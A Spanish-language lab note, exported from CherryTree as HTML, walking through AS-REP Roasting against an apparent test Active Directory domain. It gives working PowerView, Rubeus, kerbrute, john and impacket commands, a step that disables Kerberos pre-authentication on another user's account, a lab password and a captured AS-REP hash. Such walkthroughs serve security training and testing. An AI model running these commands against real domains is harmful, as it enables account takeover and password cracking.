<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AS-REP Roasting</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>AS-REP Roasting</h1><br/><p><strong><h1>¿EN QUÉ CONSISTE?</h1></strong></p><p></p><p>Si en el AS-REQ tratabamos de crackear el <strong>timestamp</strong>, en AS-REP Roasting (Replay) nos quedamos con el paquete que contiene la <strong>SessionKey</strong> cifrada con la clave del <strong>usuario</strong>.</p><p></p><p>Aquí explotaremos un privilegio que tiene ciertos usuarios como los del UAC (user account control) que permite obtener el TGT sin realizar el proceso de pre-autenticación. Es decir, siendo otro usuario, puedo enviar el nombre de un usuario cualquiera del dominio y si existe enviará el TGT cifrado con la clave del TGS y el paquete con la SessionKey cifrado con la clave privada del usuario que le indicamos.</p><p></p><p>Con este paquete vamos a coger la clave e intentar crackearla offline.</p><p></p><p><strong><h2>CON USUARIO DENTRO DE DOMINIO</h2></strong></p><p></p><p>En WS01 podemos enumerar que opción dentro del UAC de un usuario permite no requerir la pre-autenticación.</p><p></p><p><div class="codebox"><pre><br />. .<span style="color:#000000;font-weight:700">\</span>newpower.ps1<br /><span style="color:#edd400;font-weight:400">Get-DomainUser</span> <span style="color:#000000;font-weight:700">-</span>PreauthNotRequired<br /></pre></div></p><p></p><p><img src="images/31-1.png" alt="images/31-1.png" /></p><p></p><p>Esto indica que podremos interactuar con el AS y unicamente mandando el nombre nos devolverá el TGT y su SessionKey cifrada con su Password.</p><p></p><p>Si lo observamos en el DC:</p><p></p><p><img src="images/31-2.png" alt="images/31-2.png" /></p><p></p><p>Ahora vamos con Rubeus:</p><p></p><p><div class="codebox"><pre><br />.<span style="color:#000000;font-weight:700">\</span>Rubeus.exe asreproast <span style="color:#000000;font-weight:700">/</span>format<span style="color:#000000;font-weight:700">:</span>john <span style="color:#000000;font-weight:700">/</span>outfile<span style="color:#000000;font-weight:700">:</span>hash.john </pre></div></p><p></p><p>Rubeus comprobará automáticamente consultando la LDAP qué usuario del dominio es el que tiene esos permisos y captura el hash.</p><p></p><p><img src="images/31-3.png" alt="images/31-3.png" /></p><p><img src="images/31-4.png" alt="images/31-4.png" /></p><p></p><p><img src="images/31-5.png" alt="images/31-5.png" /></p><p></p><p>Lo pasamos a Kali:</p><p></p><p><img src="images/31-6.png" alt="images/31-6.png" /></p><p></p><p><div class="codebox"><pre><br />john hash.john</pre></div></p><p></p><p><img src="images/31-7.png" alt="images/31-7.png" /></p><p></p><p>Rápidamente obtenemos la clave.</p><p></p><p>En el caso de que ningún usuario tenga esa propiedad de UAC activada podremos buscar un usuario que tenga control sobre las propiedades de otro y activarlo de forma remota. En este caso vamos a suponer que empleado1 tiene estos permisos.</p><p></p><p><img src="images/31-8.png" alt="images/31-8.png" /></p><p></p><p>En este caso hemos cogido a ese usuario Florri Bethena y le agregamos la característica.</p><p></p><p>Desde el usuario empleado1 en WS01:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#729fcf;font-weight:400">Set</span><span style="color:#000000;font-weight:700">-</span>DomainObject <span style="color:#000000;font-weight:700">-</span>Identity florri.bethena <span style="color:#000000;font-weight:700">-XOR</span> @{useraccountcontrol<span style="color:#000000;font-weight:700">=</span><span style="color:#ce5c00;font-weight:400">4194304</span>} <span style="color:#ad7fa8;font-weight:400">-Verbose</span></pre></div></p><p></p><p><img src="images/31-9.png" alt="images/31-9.png" /></p><p></p><p>Si comprobamos con PowerView los usuarios con ese privilegio como antes:</p><p></p><p><img src="images/31-10.png" alt="images/31-10.png" /></p><p></p><p>Vemos que lo hemos agregado correctamente.</p><p>Ahora si a rubeus le indicamos lo mismo nos sacará los hashes de ambos usuarios.</p><p></p><p><div class="codebox"><pre><br />.<span style="color:#000000;font-weight:700">\</span>Rubeus.exe asreproast</pre></div></p><p></p><p><img src="images/31-11.png" alt="images/31-11.png" /></p><p></p><p></p><p></p><p><strong><h1>SIN USUARIO DE DOMINIO</h1></strong></p><p><h2>Es importante tener en cuenta que para poder usar RUBEUS debemos tener un usuario dentro del dominio</h2></p><p></p><p></p><p>Para ejecutar esto desde una maquina fuera del dominio usamos kali con wireshark y kerbrute:</p><p>Activamos Wireshark a escuchar en la red.</p><p></p><p><div class="codebox"><pre><br />kerbrute userenum -d corp.local users.txt </pre></div></p><p></p><p>Ahora es de suponer que en el archivo users.txt tenemos los usuarios que corresponden, aquí los hemos añadido manualmente.</p><p></p><p>Indica que son validos:</p><p></p><p><img src="images/31-12.png" alt="images/31-12.png" /></p><p></p><p>Y en wireshark observamos que si filtramos por Kerberos los paquetes que se envían ninguno ha requerido un pre-auth ya que los usuarios que tenemos en el users.txt tienen estos privilegios de UAC </p><p></p><p><img src="images/31-13.png" alt="images/31-13.png" /></p><p></p><p>Desde aquí accedemos a los datos de los AS-REP</p><p></p><p><img src="images/31-14.png" alt="images/31-14.png" /></p><p></p><p>Creamos el archivo con el formato que vimos antes:</p><p></p><p><div class="codebox"><pre>$krb5asrep$florri.bethena@corp.local:2a37e14795d141ed4c4708cf044367986f46684a4c6144e1c1906777f7bbe5ca8db15c9ac1722b16843bc5d8fbd477e873ae97ba18c9437163845bca6d214e8d516e7d29e2f0<br />ad6b6ea416a4368e2421aa13b7a8d81a5435c6f7f030e3036a4e3714cacf462f5e32fa7b6357f5ae850fb6f752a4695b43826d028850f782c016e2bd054e61db3ce8c3c3f493c1dc710e44b95e405417c7be9ac55187d4e1f<br />5ba5f19f287eb78a5e486ffb4899c86edadef1e9d4b934fc2ce976082d1df3c29f5606a6a6fa1a7be5483f7d23ca4b7f5b433c8bdb0c0d4c8be1832b2ea08f4df139c8d88beb973f2bff9d435eae428948971bf23d305ef94<br />e628b28db8e447baf98481a886343af192d91fa60e</pre></div></p><p></p><p>Y ya lo podemos crackear.</p><p></p><p></p><p><h3>También existen algunas herramientas específicas como IMPACKET</h3>:</p><p></p><p><div class="codebox"><pre><br />impacket-GetNPUsers corp.local<span style="color:#000000;font-weight:700">/</span> -users users.txt -format john -outputfile hash.hash </pre></div></p><p></p><p><img src="images/31-15.png" alt="images/31-15.png" /></p><p></p><p></p><p></p><p>Podemos usar impacket con unos credenciales que ya tengamos indicandolo:</p><p></p><p><div class="codebox"><pre><br />impacket-GetNPUsers corp.local<span style="color:#000000;font-weight:700">/</span>empleado1<span style="color:#000000;font-weight:700">:</span>Passw0rd1 -format john -outputfile hash.hash </pre></div></p><p></p><p><img src="images/31-16.png" alt="images/31-16.png" /></p><p></p><p></p><p></p></div>
</body>
</html>
